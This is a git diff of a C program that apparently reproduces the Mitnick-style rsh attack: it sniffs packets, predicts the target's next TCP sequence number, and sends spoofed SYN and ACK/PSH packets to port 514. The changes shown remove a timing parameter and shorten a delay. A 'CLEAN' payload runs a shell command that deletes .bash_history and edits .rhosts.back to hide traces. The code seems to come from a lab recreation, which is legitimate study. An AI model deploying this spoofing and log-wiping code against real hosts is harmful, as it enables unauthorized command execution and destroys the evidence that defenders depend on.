@@ -19,7 +19,7 @@
 #define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; sed -i '$ d' .rhosts.back"
 #define CLEANLEN 63
 
-void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l, double tta);
+void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
 int main(int argc, char **argv)
 {
@@ -74,8 +74,8 @@ int main(int argc, char **argv)
 
     //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
-    double tta= timeToAnswer(l,kevin,xterminal,514,514,des);
-    printf("tta: %f",tta);
+   // double tta= timeToAnswer(l,kevin,xterminal,514,514,des);
+   // printf("tta: %f",tta);
     //Retrieve the next sequence of xterminal
     uint32_t next=getNextSeq(l,kevin,xterminal,514,514,des);
 
@@ -85,12 +85,12 @@ int main(int argc, char **argv)
     {
         //Exploiting RSH
         printf("\nEXPLOITING");
-        sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l ,tta);
+        sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
     }
     else
     {
         printf("\nCLEANING");
-        sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l,tta );
+        sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
     }
     
     usleep(1000);
@@ -106,14 +106,14 @@ int main(int argc, char **argv)
     return 0;
 }
 
-void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l, double tta)
+void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l)
 {
 
 //SYN
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1234,(u_int32_t)1,NULL,0,TH_SYN);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
         sendPacket(l);
-        sleep(1);
+        usleep(250000);
 //ACK
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)TH_ACK | TH_PUSH);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)plen);
